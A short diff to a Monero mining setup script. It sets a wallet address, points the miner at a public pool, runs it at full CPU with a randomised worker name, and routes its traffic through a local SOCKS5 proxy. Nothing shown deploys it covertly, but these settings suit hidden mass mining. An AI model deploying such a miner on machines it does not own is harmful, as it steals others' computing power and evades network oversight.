@@ -4,7 +4,8 @@
 
 # --- CONFIGURE THESE ---
 WALLET="49J8k2f3qtHaNYcQ52WXkHZgWhU4dU8fuhRJcNiG9Bra3uyc2pQRsmR38mqkh2MZhEfvhkh2bNkzR892APqs3U6aHsBcN1F"
-POOL_URL="pool.waivy.dev:443"  # Your proxy domain
+POOL_URL="pool.supportxmr.com:443"
+SOCKS5_PROXY="127.0.0.1:1080"  # Tailscale SOCKS5
 CPU_PCT=100  # Max CPU usage
 WORKER_NAME="worker-$(tr -dc 'a-z0-9' </dev/urandom | head -c 6)"
 # ----------------------
@@ -73,6 +74,7 @@ cat > "$CONFIG_FILE" <<EOF
       "rig-id": "$WORKER_NAME",
       "keepalive": true,
       "tls": true,
+      "socks5": "$SOCKS5_PROXY",
       "enabled": true
     }
   ],
